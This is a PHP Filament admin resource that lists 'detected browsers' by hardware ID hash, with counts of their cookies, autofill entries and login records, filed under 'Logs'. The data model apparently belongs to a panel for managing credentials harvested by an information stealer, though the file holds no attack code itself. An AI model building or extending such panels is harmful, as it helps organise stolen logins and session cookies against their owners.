<?php

namespace App\Filament\Resources;

use App\Filament\Resources\DetectedBrowserResource\Pages;
use App\Filament\Resources\DetectedBrowserResource\RelationManagers;
use App\Models\DetectedBrowser;
use Filament\Forms;
use Filament\Resources\Form;
use Filament\Resources\Resource;
use Filament\Resources\Table;
use Filament\Tables;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\SoftDeletingScope;

class DetectedBrowserResource extends Resource
{
    protected static ?string $model = DetectedBrowser::class;
    protected static ?string $navigationGroup = 'Logs';
    protected static ?string $navigationIcon = 'heroicon-o-cloud';

    public static function form(Form $form): Form
    {
        return $form
            ->schema([

            ]);
    }

    public static function table(Table $table): Table
    {
        return $table
            ->columns([
                Tables\Columns\TextColumn::make('hwid.hash'),
                Tables\Columns\TextColumn::make('name'),
                Tables\Columns\TextColumn::make('cookies_count')->counts('cookies'),
                Tables\Columns\TextColumn::make('autofills_count')->counts('autofills'),
                Tables\Columns\TextColumn::make('login_records_count')->counts('loginRecords'),
            ])
            ->filters([
                //
            ])
            ->actions([
                //Tables\Actions\EditAction::make(),
            ])
            ->bulkActions([
                Tables\Actions\DeleteBulkAction::make(),
            ]);
    }

    public static function getRelations(): array
    {
        return [
            //
        ];
    }

    public static function getPages(): array
    {
        return [
            'index' => Pages\ListDetectedBrowsers::route('/'),
            'create' => Pages\CreateDetectedBrowser::route('/create'),
            'edit' => Pages\EditDetectedBrowser::route('/{record}/edit'),
        ];
    }
}
